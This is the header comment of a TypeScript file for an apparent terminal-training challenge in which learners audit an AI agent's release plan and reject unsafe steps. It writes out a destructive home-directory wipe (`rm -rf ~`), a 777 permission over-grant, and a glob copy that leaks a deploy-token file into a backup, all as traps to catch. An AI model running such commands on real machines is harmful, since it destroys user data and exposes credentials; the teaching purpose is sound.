/**
 * Part 11 · Terminal for the AI Era — "Approve the release plan".
 *
 * DESTINATION: src/lib/playground/challenges/part-11.ts
 *
 * Part 11 introduces no new commands, so per the spec (§4.3) this is a
 * synthesis challenge whose signature lever is *the absence of a command*:
 * the goal state includes things that must NOT have happened, and the check
 * asserts their absence from the history.
 *
 * The shape:
 *
 *  - The agent's plan holds six commands. Two are honest, one needs amending
 *    rather than refusing (777 → 755, exactly the fix section 11.1 names), and
 *    three must simply never run. Reading the plan is the whole job.
 *  - Reading is FREE. `cat`, `ls` and `echo`-as-rehearsal cost nothing, which
 *    is the entire point of the "recon is free" rule applied to the one Part
 *    that is about recon. A learner who audits carefully and then runs two
 *    commands scores GREAT; a learner who audits carefully and then runs five
 *    scores ACCEPTABLE; a learner who approves on autopilot fails, and cannot
 *    un-fail, because that is what the red-flag list means.
 *  - By Part 11 every lever is unlocked, so GREAT is the honest one: a glob
 *    for the three sources and `&&` to collapse the safe steps into one line.
 *
 * Verified against the real engine. Three findings that shaped it:
 *  - The sandbox REFUSES `rm -rf ~` with a bespoke message ("even the sandbox
 *    says no"). So the stray-space trap costs the learner nothing in the VFS —
 *    the only consequence is the history, which is the correct lesson: your
 *    laptop has no such guardrail.
 *  - `chmod 755` and `chmod +x` both report `rwxr-xr-x`; `chmod u+x` reports
 *    `rwxr--r--`. The check therefore tests the two bits that carry the lesson
 *    (owner may execute, group and other may not write) instead of a literal
 *    mode string, so every defensible amendment passes and only 777-style
 *    over-granting fails.
 *  - `cp src/* backup/` errors on the `assets/` directory but still copies the
 *    files beside it, so the overreach trap leaves `config.env` — a live deploy
 *    token — sitting in the backup. Visibly wrong, and recoverable with a
 *    single plain `rm`.
 */

